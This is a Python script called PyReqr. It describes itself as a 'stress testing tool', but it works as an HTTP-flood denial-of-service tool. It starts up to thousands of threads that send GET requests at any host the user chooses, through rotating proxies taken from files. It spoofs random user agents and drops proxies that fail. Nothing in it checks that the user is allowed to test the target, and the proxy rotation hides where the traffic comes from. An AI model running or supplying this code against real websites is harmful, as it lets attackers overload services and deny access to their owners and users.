import os, sys, time, random, getopt, socket, requests, threading, fake_useragent
from time import sleep
from requests.exceptions import SSLError, ProxyError, InvalidProxyURL, ConnectionError, Timeout

class bcolors:
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

def quitSession():
	print(" " + quit)
	sys.exit(0)

def clearTerminal():
	os.system('cls' if os.name == 'nt' else 'clear')

def loadProxies(prot="https"):
	global proxies
	list_ = "proxy" + prot + ".txt"
	if reckless == True:
		list_ = "proxyhttpr.txt"
	
	proxies = [line.rstrip('\n') for line in open(list_)]

def getProxy(pxy = ""):
	global proxies
	try:
		pxy = random.choice(proxies)
	except:
		pass
	
	return pxy

def banProxy(pxy):
	global proxies, banned
	if proxies.__contains__(pxy):
		proxies.remove(pxy)
		banned += 1

def getRuntime():
	elapsed_time = time.time() - startTime
	return str(time.strftime("%H:%M:%S", time.gmtime(elapsed_time)))

class threadedRequests(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.__handled = False
	
	def run(self):
		global generation, success, failed, s200, ns200, tries
		while self.__handled == False:
			pxy = getProxy()
			if pxy != "":
				try:
					url = protocol + "://" + host + portadd + "/"
					proxy = {protocol: "http://" + pxy}
					fua = fake_useragent.UserAgent()
					s = requests.Session()
					response = s.get(url, proxies=proxy, allow_redirects=False, stream=True, headers={
						'Accept': 'text/html',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'en-US,en;q=0.5',
						'Connection': 'keep-alive',
						'Host': url,
						'Upgrade-Insecure-Requessts': '1',
						'User-Agent' : fua.random
					})
					generation, success = generation + 1, success + 1
					if response.ok:
						s200 += 1
					else:
						ns200 += 1
				except (SSLError, ProxyError, InvalidProxyURL):
					banProxy(pxy)
					failed += 1
				except ConnectionError:
					failed, ns200 = failed + 1, ns200 + 1
				except (Timeout, Exception):
					failed += 1
				finally:
					tries += 1
					sleep(random.randrange(1,2))
			elif int(len(proxies)) == 0:
				self.__handled = True
				if os.environ["_THREADS"] != "0":
					os.environ["_THREADS"] = str(int(os.environ["_THREADS"]) - 1)
				break
		return
	
	def stop(self):
		self.__handled = True

class monitorTest(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.__handled = False
	
	def run(self):
		global proxies, banned, generation, success, failed, s200, ns200, tries
		while self.__handled == False:
			try:
				clearTerminal()
				print(protocol.upper() + ' GET REQUESTS MONITOR @' + bcolors.BLUE + host + portadd + bcolors.ENDC + ' (' + str(tries) \
					+ ')\n' + '\n Requests/s: ' + bcolors.YELLOW + str(generation) + bcolors.ENDC  + ' | Active threads: ' \
					+ bcolors.GREEN + os.environ['_THREADS'] + bcolors.ENDC + '\n Banned proxies: ' + bcolors.FAIL + str(banned) \
					+ bcolors.ENDC + ' | Active proxies: ' + bcolors.GREEN + str(len(proxies)) + bcolors.ENDC + '\n Failed requests: ' \
					+ bcolors.FAIL + str(failed) + bcolors.ENDC + ' | Successful requests: ' + bcolors.GREEN + str(success) \
					+ bcolors.ENDC + '\n Runtime: ' + bcolors.BLUE + getRuntime() + bcolors.ENDC + ' | Status 200: ' \
					+ bcolors.GREEN + str(s200) + bcolors.ENDC + ' | Status !200: ' + bcolors.FAIL + str(ns200) + bcolors.ENDC)
				generation = 0
			finally:
				sleep(1)
		return
	
	def stop(self):
		self.__handled = True

def main():
	global reckless, protocol, host, port, portadd, startTime
	protocolSet, _THREADS = None, None
	try:
		clearTerminal()
		(opts, args) = getopt.getopt(sys.argv[1:], 'rshd:vp:vt:v', ['reckless', 'ssl', 'http', 'domain=', 'port=', 'threads='])
	except ((getopt.GetoptError), Exception) as error:
		print(bcolors.FAIL + str(error) + bcolors.ENDC)
		sys.exit(2)
	for (o, a) in opts:
		if o in ('-r', '--reckless'):
			reckless = True
		elif o in ('-s', '--ssl'):
			protocolSet = True
		elif o in ('-h', '--http'):
			protocolSet, protocol, port = True, "http", 80
		elif o in ('-d', '--domain'):
			host  = a
		elif o in ('-p', '--port'):
			port = a
		elif o in ('-t', '--threads'):
			_THREADS = a
	
	try:
		print("PyReqr - Distributed threaded python GET Requests stress testing tool.")
		if not protocolSet:
			print("Attempting to load proxies...\nSend Requests over HTTPS? Y/n")
			prot = str(input(bcolors.BLUE + "Https: " + bcolors.ENDC))
			if prot.upper() != "Y":
				protocol, port = "http", 80
		
		loadProxies(protocol)
		print(str(len(proxies)) + " proxies loaded...")
		if host == "":
			print("Provide a hostname or IPv4 address to send " + protocol.upper() + " Requests to.")
			host = str(input(bcolors.BLUE + "Host: " + bcolors.ENDC))
			if host == "":
				raise socket.gaierror()
			elif socket.gethostbyname(host) == host:
				print(bcolors.GREEN + "{} is a valid IP address".format(host) + bcolors.ENDC)
			elif socket.gethostbyname(host) != host:
				print(bcolors.GREEN + "{} is a valid hostname".format(host) + bcolors.ENDC)
		
		if socket.gethostbyname(host) == host:
			while portadd == "":
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(5)
				result = sock.connect_ex((str(host), int(port)))
				sock.settimeout(None)
				if result != 0:
					print("Port " + str(port) + " doesn't seem open, connect anyway? Y or any number 0 - 65535.")
					prt = str(input(bcolors.BLUE + "Port: " + bcolors.ENDC))
					if prt.upper() != "Y":
						if int(prt) in range(0, 65535):
							port = int(prt)
						else:
							raise ValueError("Port should range between 0 and 65535.")
					else:
						portadd = ":" + str(port)
				else:
					portadd = ":" + str(port)
				
				sock.close()
		
		while startTime == 0:
			try:
				if not _THREADS:
					print("How many threads should be put to work?")
					_THREADS = int(input(bcolors.BLUE + "Threads: " + bcolors.ENDC))
				else:
					_THREADS = int(_THREADS)
				if _THREADS not in range(1, 65535):
					raise ValueError('Threads should range between 1 and 65535.')
			except KeyboardInterrupt:
				quitSession()
			except (Exception, ValueError) as error:
				_THREADS = None
				print(bcolors.FAIL + str(error) + bcolors.ENDC)
			else:
				try:
					startTime, os.environ["_THREADS"], threads = time.time(), "0", []
					for x in range(_THREADS):
						threads.append(threadedRequests())
						threads[x].daemon = True
						threads[x].start()
						os.environ["_THREADS"] = str(int(os.environ["_THREADS"]) + 1)
					
					monitor = monitorTest()
					monitor.daemon = True
					monitor.start()
				except:
					print(bcolors.FAIL + "Failed to execute, try reducing the number of threads." + bcolors.ENDC)
					quitSession()
				else:
					while monitor.is_alive():
						try:
							sleep(1)
						except KeyboardInterrupt:
							print(bcolors.GREEN + "\n Shutting threads..."  + bcolors.ENDC)
							for x in range(int(len(threads))):
								threads[x].stop()
							
							monitor.stop()
							break
					else:
						continue
					break
		
		quitSession()
	except KeyboardInterrupt:
		quitSession()
	except socket.gaierror:
		print(bcolors.FAIL + host + " isn't a valid host!" + bcolors.ENDC)
		quitSession()
	except (Exception, ValueError) as error:
		print(bcolors.FAIL + str(error) + bcolors.ENDC)
		quitSession()

reckless = False
protocol, host, portadd, proxies = "https", "", "", ""
port, generation, banned, success, failed, s200, ns200, tries, startTime = 443, 0, 0, 0, 0, 0, 0, 0, 0
quit = "Quiting..."

if __name__ == '__main__':
	main()

